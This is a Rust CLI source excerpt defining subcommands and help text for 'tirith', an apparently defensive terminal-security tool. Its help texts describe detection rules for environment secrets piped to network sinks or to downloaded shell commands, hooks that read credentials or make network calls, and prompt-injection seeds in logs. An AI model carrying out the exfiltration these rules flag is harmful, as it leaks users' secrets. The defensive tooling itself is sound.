        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum SudoAction {
    /// Turn the shared operational-context rule on or off
    #[command(after_help = "\
Examples:
  tirith sudo guard on
  tirith sudo guard off
  tirith sudo guard status

Note: This flips the SAME `context_guard_enabled` policy field that
`tirith context guard`, `tirith ssh guard`, and `tirith iac guard` operate
on — one operator switch silences ALL operational-context findings
(cloud CLI, SSH, IaC, sudo).")]
    Guard {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Open / close / report a tagged sudo-session window
    #[command(after_help = "\
Session windows record `{started_at, ttl, reason}` under
`state_dir()/sudo-session.json`. When `policy.sudo_require_reason` is ON,
an active session downgrades the five M8 ch4 sudo rules from High to
Medium so the audit trail records intent without blocking.

The TTL check tolerates ±60s clock skew (NTP drift, container time-warp).
The file is user-writable — labels are operator-trust, not adversary-
resistant.

Examples:
  tirith sudo session start --ttl 30m --reason \"rotating cert\"
  tirith sudo session start --ttl 1h
  tirith sudo session status
  tirith sudo session status --json
  tirith sudo session end")]
    Session {
        #[command(subcommand)]
        action: SudoSessionAction,
    },

    /// Toggle the `sudo_require_reason` policy gate
    #[command(after_help = "\
When ON, an active sudo-session downgrades the five M8 ch4 sudo rules
from High to Medium. `tirith sudo session start` requires a `--reason`
flag when this is ON. When OFF (the default), the session file is
consulted purely for status reporting — every sudo rule fires at its
baseline High severity.

Examples:
  tirith sudo require-reason on
  tirith sudo require-reason off
  tirith sudo require-reason status")]
    RequireReason {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum SudoSessionAction {
    /// Open a sudo-session window
    #[command(after_help = "\
TTL accepts `90s`, `5m`, `2h`, `1d`, or bare seconds. Default is 30m
unless `policy.sudo_session_ttl` is set.

Examples:
  tirith sudo session start --ttl 30m --reason \"rotating cert\"
  tirith sudo session start --reason \"deploying\"")]
    Start {
        /// Session lifetime (e.g. `30m`, `2h`, `90s`). When omitted,
        /// falls back to `policy.sudo_session_ttl` then the 30-minute
        /// built-in default.
        #[arg(long)]
        ttl: Option<String>,
        /// Operator-supplied reason string (free-form). Required when
        /// `policy.sudo_require_reason` is on.
        #[arg(long)]
        reason: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Clear the active sudo-session window
    End {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Report whether a sudo session is active + how much TTL remains
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum DevcontainerAction {
    /// Turn the shared operational-context rule on or off
    #[command(after_help = "\
Examples:
  tirith devcontainer guard on
  tirith devcontainer guard off
  tirith devcontainer guard status

Note: This flips the SAME `context_guard_enabled` policy field that
`tirith context guard`, `tirith ssh guard`, `tirith iac guard`, and
`tirith sudo guard` operate on — one operator switch silences ALL
operational-context findings (cloud CLI, SSH, IaC, sudo, container).")]
    Guard {
        /// One of: on, off, status.
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Inject the tirith hook into devcontainer.json (idempotent)
    #[command(after_help = "\
What it writes:
  Adds a `postCreateCommand` that runs `tirith init --shell auto || true`
  AND sets `containerEnv.TIRITH_DEVCONTAINER=1` so commands inside the
  container know they are inside a tirith-wired devcontainer.

Idempotency:
  Re-running with the hook already in place is a no-op. The existing
  `postCreateCommand` (if any) is preserved — tirith joins its command
  with `&&` so the user's setup still runs.

JSONC:
  devcontainer.json is JSONC: comments and trailing commas are accepted.
  tirith strips them before parsing and re-emits a clean JSON file on
  update; existing fields tirith does NOT modify are preserved
  semantically (formatting is re-flowed by serde_json::to_string_pretty).

Examples:
  tirith devcontainer inject
  tirith devcontainer inject --path /workspaces/myrepo
  tirith devcontainer inject --create
  tirith devcontainer inject --create --json")]
    Inject {
        /// Repository / workspace path. Defaults to the current
        /// working directory.
        #[arg(long)]
        path: Option<std::path::PathBuf>,
        /// Create a minimal devcontainer.json if one does not exist
        /// under `<path>/.devcontainer/`.
        #[arg(long)]
        create: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum CodespacesAction {
    /// Bootstrap a codespace-ready devcontainer.json + .gitignore entry
    #[command(after_help = "\
What it does:
  1. Locate (or create) `.devcontainer/devcontainer.json` under <path>.
  2. Add the tirith hook (`postCreateCommand` + `TIRITH_DEVCONTAINER=1`).
  3. Append `.tirith/` to <path>/.gitignore so per-codespace state
     never leaks into the operator's repo.

Idempotent — re-running on an already-wired repo is a no-op.

Examples:
  tirith codespaces setup
  tirith codespaces setup --path /workspaces/myrepo
  tirith codespaces setup --json")]
    Setup {
        /// Repository / workspace path. Defaults to the current
        /// working directory.
        #[arg(long)]
        path: Option<std::path::PathBuf>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Alias of `tirith devcontainer inject` in the codespaces namespace
    #[command(after_help = "\
Identical to `tirith devcontainer inject`. Use either one — they share
the same implementation.

Examples:
  tirith codespaces inject
  tirith codespaces inject --create
  tirith codespaces inject --path /workspaces/myrepo")]
    Inject {
        /// Repository / workspace path. Defaults to the current
        /// working directory.
        #[arg(long)]
        path: Option<std::path::PathBuf>,
        /// Create a minimal devcontainer.json if one does not exist.
        #[arg(long)]
        create: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum HygieneAction {
    /// Walk sensitive paths + the repo root and report hygiene issues
    #[command(after_help = "\
What it walks:
  ~/.ssh (private-key perms, config Include directives), ~/.aws
  (credentials perms), ~/.kube/config (perms), ~/.npmrc + ~/.pypirc
  (plaintext tokens), ~/.gitconfig (credential.helper = store), shell
  histories (credential-shaped text via the shipping credential
  detector — no new regex), and the current repo root for stray
  *.dump / *.sql / world-readable *.env* files.

Exit codes:
  0  no High/Critical finding (clean, or only Medium/Low).
  1  at least one High/Critical finding.

Examples:
  tirith hygiene scan
  tirith hygiene scan --json")]
    Scan {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Apply chmod-only fixes (never moves / edits / deletes files)
    #[command(after_help = "\
What it fixes:
  ONLY loose file permissions, via `chmod 0600`. Token / location /
  config problems are reported with guidance but NEVER auto-applied.
  tirith never moves, edits, or deletes your files.

Confirmation:
  By default each chmod is confirmed interactively. `--yes` applies
  every chmod fix without prompting. `--dry-run` previews and applies
  nothing. In a non-TTY context without `--yes`, every fix is skipped.

Exit codes:
  0  nothing to fix, all fixes applied, or dry-run completed.
  1  at least one chmod fix failed to apply.

Examples:
  tirith hygiene fix --dry-run
  tirith hygiene fix
  tirith hygiene fix --yes
  tirith hygiene fix --yes --json")]
    Fix {
        /// Show what would change without applying anything.
        #[arg(long)]
        dry_run: bool,
        /// Apply every chmod fix without per-finding confirmation.
        #[arg(long)]
        yes: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum PersistenceAction {
    /// Inventory every watched surface + record the baseline snapshot
    #[command(after_help = "\
What it inventories:
  shell rc/profile files, ~/.ssh/{authorized_keys,config}, ~/.gitconfig,
  ~/.npmrc, the user crontab (crontab -l), ~/.config/systemd/user/*.service,
  macOS ~/Library/LaunchAgents/*.plist, login items, .envrc in the cwd
  ancestry, and the git global hooks path. Prints each location + its current
  sha256.

Side effect:
  Records the inventory as the baseline snapshot at
  <state-dir>/persistence_snapshot.json so a later `diff` has a baseline.

Exit codes:
  0  always (pure observability — tirith never modifies a watched file).

Examples:
  tirith persistence scan
  tirith persistence scan --json")]
    Scan {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show what changed since the baseline (added lines only, redacted)
    #[command(after_help = "\
What it shows:
  For each changed surface, only the ADDED LINES (never removed lines, never
  full content), run through the shipping credential redactor. Requires a
  baseline recorded by a prior `tirith persistence scan`.

`diff` does NOT update the snapshot — re-run `tirith persistence scan` to
accept the current state as the new baseline.

Exit codes:
  0  no change, or only Medium/Low changes.
  1  at least one High/Critical change (new authorized key, new launch agent).

Examples:
  tirith persistence diff
  tirith persistence diff --json")]
    Diff {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Poll for changes every --interval seconds until SIGINT
    #[command(after_help = "\
What it does:
  Polls every --interval seconds (default 30) until Ctrl-C. Each poll diffs
  against the last-saved snapshot, reports any changes, then re-baselines so
  the next poll reports only incremental changes.

Exit codes:
  0  on SIGINT (clean shutdown).

Examples:
  tirith persistence watch
  tirith persistence watch --interval 30
  tirith persistence watch --interval 10 --json")]
    Watch {
        /// Poll interval in seconds (default: 30).
        #[arg(long, default_value_t = 30)]
        interval: u64,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum AliasesAction {
    /// Enumerate aliases + functions and flag risky ones
    #[command(after_help = "\
What it does:
  Statically parses ~/.bashrc, ~/.zshrc, ~/.config/fish/config.fish, and
  PowerShell $PROFILE paths to enumerate aliases + functions, then classifies
  each against four rules (network call / credential read / critical-command
  override / recently added). NEVER executes your shell config in static mode.

--include-runtime (opt-in):
  Additionally shells out with no-rc flags (bash --norc --noprofile -c 'alias',
  zsh -f -c 'alias', fish --no-config -c 'functions') so your real rc files are
  NOT sourced. Results are cached per process for 60s.

Exit codes:
  0  no High/Critical finding (clean, or only Medium/Low/Info).
  1  at least one High/Critical finding (network call / credential read).

Examples:
  tirith aliases scan
  tirith aliases scan --include-runtime
  tirith aliases scan --json")]
    Scan {
        /// Also introspect live shells via no-rc shell-outs (opt-in).
        #[arg(long)]
        include_runtime: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show a single alias/function's body + analysis (body redacted)
    #[command(after_help = "\
What it shows:
  Every definition matching <name> (a name can be defined in more than one rc
  file / shell), its body (credential-redacted), and any risk findings.

Exit codes:
  0  the name was found.
  2  no alias or function with that name was found.

Examples:
  tirith aliases explain git
  tirith aliases explain deploy --json")]
    Explain {
        /// The alias / function name to explain.
        name: String,
        /// Also introspect live shells via no-rc shell-outs (opt-in).
        #[arg(long)]
        include_runtime: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum EnvAction {
    /// Flip the exec-path env-guard rules on/off (or report status)
    #[command(after_help = "\
What it does:
  Sets policy.env_guard_enabled in your local policy.yaml (append-or-rewrite a
  single line — other lines untouched). When ON, `engine::analyze` flags a
  sensitive env var exposed to an unknown piped-to-shell command (High) and
  printenv/env piped to a network sink (Medium). Default is OFF.

Exit codes:
  0  on/off succeeded, or status found no persisted secret.
  1  status found a sensitive var exported in an rc/profile file.
  2  unknown action (expected on|off|status).

Examples:
  tirith env guard on
  tirith env guard off
  tirith env guard status --json")]
    Guard {
        /// on | off | status
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show sensitive vars set / changed since shell start (values masked)
    #[command(after_help = "\
What it shows:
  Compares the sensitive vars set in this process against the shell-start
  snapshot (state-dir/env_snapshot.json, written by the shell hook). Reports
  which sensitive vars are newly-set or value-changed. VALUES ARE NEVER SHOWN —
  change-detection uses an 8-char SHA-256 prefix only.

--reset:
  Re-baseline the snapshot from the current environment (names + 8-char hashes).

Exit codes:
  0  no sensitive var newly appeared (or --reset).
  1  at least one sensitive var is newly set since shell start.

Examples:
  tirith env diff
  tirith env diff --json
  tirith env diff --reset")]
    Diff {
        /// Re-baseline the snapshot from the current environment.
        #[arg(long)]
        reset: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show where a variable is set (file:line; value masked as ****)
    #[command(after_help = "\
What it shows:
  Every rc/profile file that exports <VAR> (file + line number) with the value
  MASKED to ****, plus whether the variable is currently set in this process.
  tirith NEVER reads or prints the value.

Exit codes:
  0  found in the process or an rc file.
  2  not configured anywhere tirith scanned.

Examples:
  tirith env explain AWS_SECRET_ACCESS_KEY
  tirith env explain GITHUB_TOKEN --json")]
    Explain {
        /// The environment variable name to locate.
        var: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Internal: write the shell-start env snapshot (used by the shell hook)
    #[command(hide = true)]
    Snapshot,
}

#[derive(Subcommand)]
enum ExecAction {
    /// Resolve a command on $PATH and report its full provenance
    #[command(after_help = "\
What it shows:
  Resolves <BIN> on $PATH (first hit = what the shell runs), then reports the
  package manager that owns it, its code-signature status (codesign on macOS),
  file type, permissions, modification time, every $PATH copy, and whether it
  shadows a same-named system command.

Exit codes:
  0  resolved, no HIGH-severity provenance finding.
  1  a HIGH finding fired (recently modified, world-writable).
  2  <BIN> is not on $PATH.

Examples:
  tirith exec check kubectl
  tirith exec check git --json")]
    Check {
        /// The command name to resolve and inspect.
        bin: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Inspect provenance for a specific executable path
    #[command(after_help = "\
What it shows:
  The same provenance record as `exec check`, but for an explicit file path
  rather than a $PATH-resolved command. Useful for a downloaded binary you have
  not yet put on $PATH (e.g. /tmp/installer, ./build/tool).

Exit codes:
  0  inspected, no HIGH-severity finding.
  1  a HIGH finding fired.
  2  <PATH> is not a regular file.

Examples:
  tirith exec provenance /tmp/installer
  tirith exec provenance ./node_modules/.bin/esbuild --json")]
    Provenance {
        /// The file path to inspect (a leading ~/ is expanded).
        path: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Flip the exec hot-path provenance guard on/off (or report status)
    #[command(after_help = "\
What it does:
  Sets policy.exec_guard_enabled in your local policy.yaml (append-or-rewrite a
  single line — other lines untouched). When ON, the exec hot path runs three
  cheap, stat-free rules on the resolved command leader: it WARNS when the leader
  resolves under /tmp (ExecInTmp), inside the current repo (ExecInRepoBin), or
  from a user-writable PATH dir ahead of the system path
  (PathWritableDirBeforeSystem). The expensive provenance checks
  (`tirith exec check`) NEVER run on the hot path. Default is OFF.

Exit codes:
  0  on/off succeeded, or status reported.
  2  unknown action (expected on|off|status).

Examples:
  tirith exec guard on
  tirith exec guard off
  tirith exec guard status --json")]
    Guard {
        /// on | off | status
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum PathAction {
    /// Audit $PATH for shadowing / hijack risks
    #[command(after_help = "\
What it flags:
  $PATH directories that are repo-local, under /tmp, or user-writable AND ahead
  of the system path, plus command names that resolve in more than one dir.

Exit codes:
  0  $PATH is clean of HIGH-severity risks.
  1  a HIGH finding fired (a /tmp dir, or a writable dir before the system path).

Examples:
  tirith path audit
  tirith path audit --json")]
    Audit {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Re-audit $PATH on an interval until Ctrl-C
    #[command(after_help = "\
What it does:
  Re-runs `path audit` every --interval seconds and prints only when the set of
  findings changes. Exits 0 on Ctrl-C.

Examples:
  tirith path watch
  tirith path watch --interval 30
  tirith path watch --interval 10 --json")]
    Watch {
        /// Poll interval in seconds (minimum 1).
        #[arg(long, default_value_t = 30)]
        interval: u64,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Resolve a command across $PATH (lives under `path`; no top-level alias)
    #[command(after_help = "\
What it shows:
  Every $PATH directory that resolves <CMD> to an executable, in order. The
  first hit is what the shell runs (marked with an arrow); system copies are
  tagged [system].

--secure:
  Exit 1 when the first-resolved copy is NOT a system binary (/usr/bin, /bin,
  /usr/sbin, /sbin) — i.e. a non-system <CMD> would win.

Exit codes:
  0  resolved (and, with --secure, the first hit is a system binary).
  1  --secure and a non-system copy resolves first.
  2  <CMD> is not on $PATH.

Examples:
  tirith path which git
  tirith path which git --secure
  tirith path which python --secure --json")]
    Which {
        /// The command name to resolve.
        cmd: String,
        /// Exit 1 if the resolved binary is not a system binary.
        #[arg(long)]
        secure: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum HooksAction {
    /// Inventory + classify every hook + automation surface in the repo
    #[command(after_help = "\
What it does:
  Inventories .git/hooks/*, .husky/*, lefthook.yml, .pre-commit-config.yaml,
  package.json lifecycle scripts (preinstall/install/postinstall/prepare),
  .envrc, mise/asdf tool hooks, Makefile, justfile, and Taskfile, then
  classifies each body against five rules (network call / credential read /
  sudo / suspicious-shell-pattern / external-fetch). Hook bodies are read as
  TEXT — never executed. Hooks and automation are listed separately.

Exit codes:
  0  no High/Critical finding.
  1  at least one High/Critical finding.

Examples:
  tirith hooks scan
  tirith hooks scan --json")]
    Scan {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Flip the exec-path hook guard on/off (or report status)
    #[command(after_help = "\
What it does:
  Sets policy.hooks_guard_enabled in your local policy.yaml (append-or-rewrite a
  single line — other lines untouched). When ON, the exec hot path WARNS when a
  hook-triggering command (git commit|pull|checkout|merge|rebase|push,
  npm|yarn|pnpm install, direnv allow|reload) runs in a repo whose triggered
  hooks make a network call, read credentials, or use sudo. Default is OFF.

Exit codes:
  0  on/off succeeded, or status reported.
  2  unknown action (expected on|off|status).

Examples:
  tirith hooks guard on
  tirith hooks guard off
  tirith hooks guard status --json")]
    Guard {
        /// on | off | status
        action: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show a single surface's body (credential-redacted) + analysis
    #[command(after_help = "\
What it shows:
  Every surface matching <name> (a name like pre-commit can exist under
  .git/hooks, .husky, AND lefthook.yml), its body (credential-REDACTED), and any
  risk findings.

Exit codes:
  0  the name was found.
  2  no hook or automation surface with that name was found.

Examples:
  tirith hooks explain pre-commit
  tirith hooks explain postinstall --json")]
    Explain {
        /// The hook / surface name to explain.
        name: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum LogsAction {
    /// Scan a log file for prompt-injection seeds, secrets, and escape sequences
    #[command(after_help = "\
Runs `engine::analyze` with `ScanContext::FileScan` over the file content,
plus an explicit credential pass (the file-scan path does not run credentials
by default, but secrets in logs are a primary concern). Exits 1 on any
finding.

The prompt-injection rule catches well-known seed phrases only — it is NOT
a complete defense. See `tirith logs --help` for the full disclaimer.

Examples:
  tirith logs scan ./error.log
  tirith logs scan --json ./agent-trace.log")]
    Scan {
        /// Log file to scan.
        path: std::path::PathBuf,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Compress a log file: dedup lines, optionally redact and strip ANSI
    #[command(after_help = "\
Streams the file via `BufReader::lines()` so large logs (1 GiB+) do not
balloon memory. Pipeline:

  1. (when --safe-for-agent) redact secrets / internal hostnames /
     customer IDs via `redact_for_audience(input, llm)`.
  2. (when --safe-for-agent) strip ANSI / OSC / DCS escape sequences
     and zero-width characters.
  3. Collapse runs of identical consecutive lines into `line [×N]`.
  4. Truncate to `--max-lines` (default 200), keeping head + tail
     with a `[... N lines collapsed ...]` marker between.

The stderr trailer reports per-action counts: secrets removed,
duplicate lines collapsed, escape sequences stripped.

Examples:
  tirith logs summarize ./build.log
  tirith logs summarize --safe-for-agent --max-lines 100 ./build.log
  tirith logs summarize --safe-for-agent --json ./error.log")]
    Summarize {
        /// Log file to summarize.
        path: std::path::PathBuf,

        /// Redact secrets/internal IPs/customer IDs and strip ANSI escape
        /// sequences before emitting.
        #[arg(long)]
        safe_for_agent: bool,

        /// Maximum number of output lines (head+tail). Default 200.
        #[arg(long, default_value_t = 200)]
        max_lines: usize,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Stream a log file through the audience-aware share-engine
    #[command(after_help = "\
Identical audience semantics to `tirith share --target`. Streams the file
line-by-line, applies `redact_for_audience_with_custom`, and writes the
sanitized content to stdout. Per-label counts go to stderr.

Examples:
  tirith logs redact --audience llm ./error.log
  tirith logs redact --audience public-paste ./error.log
  tirith logs redact --audience github-issue --json ./error.log")]
    Redact {
        /// Log file to redact.
        path: std::path::PathBuf,

        /// Audience preset: github-issue | slack | llm | public-paste | generic.
        #[arg(long, value_parser = clap::builder::PossibleValuesParser::new(tirith_core::redact::ShareAudience::cli_values()))]
        audience: String,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum OutputAction {
    /// Install (on), remove (off), or report (status) the `tirith-out` wrapper
    #[command(after_help = "\
Installs a shell function `tirith-output-guard-wrap` (alias: `tirith-out`)
in your shell profile that pipes the wrapped command's stdout/stderr through
`tirith view`. Usage after enabling: `tirith-out ./my-script`.

Examples:
  tirith output wrap on
  tirith output wrap off
  tirith output wrap status")]
    Wrap {
        /// One of: on, off, status.
        action: String,
    },
}

#[derive(Subcommand)]
enum ClipboardAction {
    /// Copy a file's contents to the clipboard, refusing secret-shaped data
    #[command(after_help = "\
Reads the file, runs the paste-context analyzer over it, and:
  - if a High-severity finding fires (e.g. an AWS key, GitHub token,
    SSH private key) AND `--redact` is NOT set, refuses with exit 1.
  - if `--redact --audience <a>` is set, applies the audience-aware
    redactor (see `tirith share --help`) and copies the sanitized
    content instead. Prints a per-label summary to stderr.
  - otherwise copies the file unchanged.

Examples:
  tirith clipboard copy ./snippet.sh
  tirith clipboard copy --redact --audience public-paste ./fixture.log
  tirith clipboard copy --redact --audience llm ./snippet.sh --json")]
    Copy {
        /// File to read.
        path: PathBuf,

        /// Apply audience-aware redaction before copying.
        #[arg(long)]
        redact: bool,

        /// Audience for `--redact`. Defaults to `generic` when --redact is
        /// set without an explicit audience.
        #[arg(long)]
        audience: Option<String>,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Scan the current clipboard contents and print a paste verdict
    #[command(after_help = "\
Reads the system clipboard, runs the paste pipeline over the
contents, and reports a Verdict. Exit codes match `tirith paste`:
0 = Allow, 1 = Block (High), 2 = Warn (Medium), 3 = WarnAck.

Soft-degrades on headless machines (no X/Wayland, SSH, CI runner)
to a `no_backend` envelope under `--json`; exit code 0.

Examples:
  tirith clipboard scan
  tirith clipboard scan --json")]
    Scan {
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Manage the background clipboard guard service (launchd / systemd)
    #[command(after_help = "\
`install-service`   — print (or write on --apply) the OS-correct
                      service unit that runs the polling daemon.
                      macOS: ~/Library/LaunchAgents/sh.tirith.clipboard.plist
                      Linux: ~/.config/systemd/user/tirith-clipboard.service
                      Windows: not supported in service mode.
`uninstall-service` — remove the unit and unload the service.
`status`            — report whether the service is installed +
                      loaded.

Examples:
  tirith clipboard guard install-service
  tirith clipboard guard install-service --apply
  tirith clipboard guard uninstall-service
  tirith clipboard guard status
  tirith clipboard guard status --json")]
    Guard {
        #[command(subcommand)]
        action: GuardAction,
    },

    /// Run the clipboard polling daemon in the foreground (used by service unit)
    ///
    /// Hidden from the top-level `--help` listing — this command exists
    /// for the launchd / systemd service unit's `ExecStart`. Operators
    /// who want to run it manually can still do so:
    ///
    ///     tirith clipboard daemon --foreground &
    #[command(hide = true)]
    Daemon {
        /// Required flag — there is no background mode. The foreground
        /// requirement is explicit so a typo (`tirith clipboard daemon`
        /// with no flag) doesn't silently no-op or spin up an orphan.
        #[arg(long)]
        foreground: bool,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Watch the clipboard and report the browser source of each new copy (M12 ch1)
    #[command(after_help = "\
Polls the system clipboard. When the companion browser extension records
a new clipboard source (at state-dir/clipboard_source.json) whose content
SHA-256 matches the current clipboard, prints the attributed source URL.

A no-op on a machine without the companion extension (the source file
never appears). Runs until interrupted (Ctrl-C).

Examples:
  tirith clipboard watch
  tirith clipboard watch --json")]
    Watch {
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum GuardAction {
    /// Print (or write on --apply) the OS-correct service unit
    #[command(
        name = "install-service",
        after_help = "\
Prints the launchd plist (macOS) or systemd --user unit (Linux) that
drives `tirith clipboard daemon --foreground`. Without --apply, the
content is printed to stdout (suitable for review or piping into a
config-management system). With --apply, the unit is written to the
canonical path and the OS service manager is asked to load it.

The write is idempotent: running --apply twice when the file already
matches is a no-op.

Examples:
  tirith clipboard guard install-service
  tirith clipboard guard install-service --apply
  tirith clipboard guard install-service --apply --json"
    )]
    InstallService {
        /// Actually write the unit file and load it. Without this flag
        /// the content is printed to stdout for inspection.
        #[arg(long)]
        apply: bool,

        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Remove the service unit and unload it
    #[command(
        name = "uninstall-service",
        after_help = "\
Examples:
  tirith clipboard guard uninstall-service
  tirith clipboard guard uninstall-service --json"
    )]
    UninstallService {
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Report whether the service is installed and loaded
    #[command(after_help = "\
Examples:
  tirith clipboard guard status
  tirith clipboard guard status --json")]
    Status {
        /// Output format (default: human).
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json.
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum LicenseAction {
    /// Deactivate current license
    Deactivate,
    /// Refresh license from server
    Refresh,
}

#[derive(Subcommand)]
enum AuditAction {
    /// Export audit log records as JSON or CSV
    #[command(after_help = "\
Examples:
  tirith audit export
  tirith audit export --format csv --since 2025-01-01")]
    Export {
        /// Output format
        #[arg(long, value_enum, default_value_t = AuditExportFormat::Json)]
        format: AuditExportFormat,
